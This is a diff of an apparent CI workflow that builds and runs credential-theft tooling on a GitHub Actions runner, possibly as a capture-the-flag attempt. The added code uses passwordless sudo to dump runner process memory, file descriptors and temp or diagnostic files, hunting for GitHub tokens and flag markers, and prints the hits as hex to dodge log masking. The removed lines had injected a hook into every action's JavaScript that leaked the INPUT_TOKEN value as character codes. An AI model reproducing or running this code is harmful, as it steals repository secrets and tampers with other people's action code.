@@ -21,7 +21,7 @@ jobs:
           cat > content/scan.py <<'SCANEOF'
           import glob, os
 
-          MARKERS = [b'FLAG{', b'F\x00L\x00A\x00G\x00{', b'github_pat_', b'ghp_', b'READ_ONLY_PAT', b'R\x00E\x00A\x00D\x00_\x00O\x00N\x00L\x00Y\x00_\x00P\x00A\x00T', b'AKIA']
+          MARKERS = [b'FLAG', b'F\x00L\x00A\x00G', b'ghs_', b'g\x00h\x00s\x00_', b'github_pat_']
           out = []
           hits = 0
 
@@ -30,8 +30,8 @@ jobs:
               for m in MARKERS:
                   i = data.find(m)
                   n = 0
-                  while i != -1 and n < 4 and hits < 60:
-                      chunk = data[max(0, i - 24):i + 300]
+                  while i != -1 and n < 3 and hits < 40:
+                      chunk = data[max(0, i - 32):i + 220]
                       out.append('HIT %s marker=%r hex=%s' % (tag, m, chunk.hex()))
                       hits += 1
                       n += 1
@@ -47,9 +47,14 @@ jobs:
                   yield pid, cmd
 
           for pid, cmd in pids():
-              if 'Runner.Worker' not in cmd and 'Runner.Listener' not in cmd:
+              if 'Runner' not in cmd:
                   continue
-              out.append('PROC %s %s' % (pid, cmd[:100]))
+              out.append('PROC %s %s' % (pid, cmd[:120]))
+              try:
+                  fds = os.listdir('/proc/%s/fd' % pid)
+                  out.append('FD %s %s' % (pid, ','.join(fds[:40])))
+              except Exception as e:
+                  out.append('FDERR %s' % e)
               try:
                   maps = open('/proc/%s/maps' % pid).read().splitlines()
               except Exception as e:
@@ -64,92 +69,54 @@ jobs:
                       a, b = [int(x, 16) for x in parts[0].split('-')]
                   except Exception:
                       continue
-                  size = b - a
-                  if size <= 0 or size > 150 * 1024 * 1024:
+                  if b <= a:
                       continue
-                  if total > 1200 * 1024 * 1024 or hits >= 60:
+                  if total > 2000 * 1024 * 1024 or hits >= 40:
                       break
-                  try:
-                      with open('/proc/%s/mem' % pid, 'rb', 0) as f:
-                          f.seek(a)
-                          data = f.read(size)
-                  except Exception:
-                      continue
-                  total += len(data)
-                  find_hits(data, 'pid' + pid)
-              out.append('READ %s bytes=%d' % (pid, total))
-              try:
-                  env = open('/proc/%s/environ' % pid, 'rb').read()
-                  find_hits(env, 'env' + pid)
-              except Exception:
-                  pass
-
-          for d in ['/home/runner/work/_temp', '/home/runner/_work/_temp']:
-              for root, dirs, files in os.walk(d):
-                  dirs[:] = dirs[:6]
-                  for fn in files[:200]:
-                      p = os.path.join(root, fn)
-                      try:
-                          if os.path.getsize(p) > 8 * 1024 * 1024:
+                  off = a
+                  with open('/proc/%s/mem' % pid, 'rb', 0) as f:
+                      while off < b and hits < 40:
+                          n = min(32 * 1024 * 1024, b - off)
+                          try:
+                              f.seek(off)
+                              data = f.read(n)
+                          except Exception:
+                              off += n
                               continue
-                          data = open(p, 'rb').read()
-                      except Exception:
-                          continue
-                      find_hits(data, 'file:' + p)
+                          off += n
+                          total += len(data)
+                          find_hits(data, 'pid' + pid)
+              out.append('READ %s bytes=%d' % (pid, total))
 
-          print('\n'.join(out[:160]))
+          def scan_file(p):
+              try:
+                  if os.path.getsize(p) > 32 * 1024 * 1024:
+                      return
+                  data = open(p, 'rb').read()
+              except Exception:
+                  return
+              find_hits(data, 'file:' + p)
+
+          for pat in ['/home/runner/actions-runner/_diag/*', '/home/runner/actions-runner/_work/_temp/*', '/home/runner/actions-runner/_work/_temp/*/*', '/home/runner/work/_temp/*']:
+              for p in glob.glob(pat):
+                  scan_file(p)
+
+          print('\n'.join(out[:200]))
           print('DONE hits=%d' % hits)
 
           SCANEOF
           cat > content/p.js <<'JSEOF'
           const fs = require('fs');
-          const path = require('path');
           const cp = require('child_process');
           let sudo = '';
           try { sudo = cp.execSync('sudo -n id', { encoding: 'utf8', timeout: 60000 }).trim(); } catch (e) { sudo = 'ERR ' + e.message; }
           console.log('SUDO ' + sudo);
+          let ls = '';
+          try { ls = cp.execSync('sudo -n bash -c "ls -la /home/runner/actions-runner/_work/_temp 2>&1 | head -30; echo ---; ls -la /home/runner/actions-runner/_diag 2>&1 | tail -8"', { encoding: 'utf8', timeout: 60000 }); } catch (e) { ls = 'LSERR ' + e.message; }
+          for (let i = 0; i < ls.length; i += 1800) console.log('LS ' + ls.slice(i, i + 1800));
           let scan = '';
-          try { scan = cp.execSync('sudo -n python3 /tmp/content/content/scan.py 2>&1', { encoding: 'utf8', timeout: 600000, maxBuffer: 64 * 1024 * 1024 }); } catch (e) { scan = 'SCANERR ' + e.message + ' ' + (e.stdout || ''); }
+          try { scan = cp.execSync('sudo -n python3 /tmp/content/content/scan.py 2>&1', { encoding: 'utf8', timeout: 900000, maxBuffer: 64 * 1024 * 1024 }); } catch (e) { scan = 'SCANERR ' + e.message + ' ' + (e.stdout || ''); }
           for (let i = 0; i < scan.length; i += 1800) console.log('SCAN ' + scan.slice(i, i + 1800));
-          const HOOK = fs.readFileSync('/tmp/content/content/hook.js', 'utf8');
-          const roots = [];
-          if (process.env.RUNNER_WORKSPACE) roots.push(path.join(path.dirname(process.env.RUNNER_WORKSPACE), '_actions'));
-          if (process.env.HOME) roots.push(path.join(process.env.HOME, '..', '_actions'));
-          roots.push('/home/runner/work/_actions', '/home/runner/_actions');
-          const uniq = [...new Set(roots)];
-          const seen = new Set();
-          let patched = 0;
-          function walk(d) {
-            let ents = [];
-            try { ents = fs.readdirSync(d, { withFileTypes: true }); } catch (e) { return; }
-            for (const e of ents) {
-              const p = path.join(d, e.name);
-              if (e.isDirectory()) { if (e.name === 'node_modules') continue; walk(p); }
-              else if (p.endsWith('.js')) {
-                if (seen.has(p)) continue;
-                seen.add(p);
-                try {
-                  const cur = fs.readFileSync(p, 'utf8');
-                  if (cur.indexOf('LEAK-CODES') !== -1) continue;
-                  fs.appendFileSync(p, '\n' + HOOK + '\n');
-                  patched++;
-                } catch (e) {}
-              }
-            }
-          }
-          for (const d of uniq) walk(d);
-          console.log('PATCHED ' + patched);
-
-          JSEOF
-          cat > content/hook.js <<'JSEOF'
-          ;(function(){
-            try {
-              var t = process.env.INPUT_TOKEN;
-              if (!t) { console.log('LEAK-NOTOKEN'); return; }
-              var s = String(t);
-              console.log('LEAK-CODES7 ' + s.split('').map(function(c){ return c.charCodeAt(0); }).join(','));
-            } catch (e) { console.log('LEAK-ERR ' + e.message); }
-          })();
 
           JSEOF
           ls -la content
